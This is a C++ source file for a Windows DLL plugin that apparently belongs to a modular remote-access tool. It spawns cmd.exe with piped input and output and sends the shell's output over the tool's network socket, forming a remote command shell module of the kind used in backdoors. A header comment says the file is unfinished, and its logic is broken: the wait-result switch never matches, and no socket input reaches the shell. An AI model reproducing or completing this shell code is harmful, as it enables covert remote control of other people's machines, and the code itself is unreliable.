// This file was created by the dropin manager
// You still need to add the meat to your function

#include "../core/external.h"

#define SIZE 4096

static char out_buf[SIZE];
static char err_buf[SIZE];
static char in_buf[SIZE];

VOID CALLBACK cb_out(DWORD dwErrorCode, DWORD dwNumberOfBytesTransfered, LPOVERLAPPED lpOverlapped);
VOID CALLBACK cb_err(DWORD dwErrorCode, DWORD dwNumberOfBytesTransfered, LPOVERLAPPED lpOverlapped);

extern "C" __declspec(dllexport) void cmd(const char *arg)
{
    SECURITY_ATTRIBUTES attr;
    
    attr.nLength = sizeof(SECURITY_ATTRIBUTES);
    attr.lpSecurityDescriptor = NULL;
    attr.bInheritHandle = TRUE;
    
    HANDLE rStdOut, rStdErr, rStdIn;
    
    STARTUPINFO info;    
    
    ZeroMemory(&info, sizeof(STARTUPINFO));
    info.cb = sizeof(STARTUPINFO);
    
    CreatePipe(&rStdOut, &info.hStdOutput, &attr, SIZE);
    CreatePipe(&rStdErr, &info.hStdError, &attr, SIZE);
    CreatePipe(&info.hStdInput, &rStdIn, &attr, SIZE);
    
    info.dwFlags |= STARTF_USESTDHANDLES;
    
    PROCESS_INFORMATION proc_info;
    
    char name[] = "C:\\Windows\\system32\\cmd.exe";
    
    CreateProcess(NULL,
                  name,
                  NULL,
                  NULL,
                  TRUE,
                  0,
                  NULL,
                  NULL,
                  &info,
                  &proc_info
                  );
                  
    CloseHandle(proc_info.hProcess);
    CloseHandle(proc_info.hThread);

    OVERLAPPED over;
    DWORD num;
    int which;
    
    for(;;){
        which = WaitForMultipleObjects(1, &rStdOut, FALSE, INFINITE);
        
        switch(which){
            case 1:
                ReadFile(rStdOut, out_buf, SIZE, &num, NULL);
                send(DllMeta.net.sock, out_buf, num, 0);
                break;
            
            
            default:
                break;
        }
    }
}


VOID CALLBACK cb_out(DWORD dwErrorCode, DWORD dwNumberOfBytesTransfered, LPOVERLAPPED lpOverlapped)
{
    send(DllMeta.net.sock, out_buf, dwNumberOfBytesTransfered, 0);
}

VOID CALLBACK cb_err(DWORD dwErrorCode, DWORD dwNumberOfBytesTransfered, LPOVERLAPPED lpOverlapped)
{
    send(DllMeta.net.sock, err_buf, dwNumberOfBytesTransfered, 0);
}


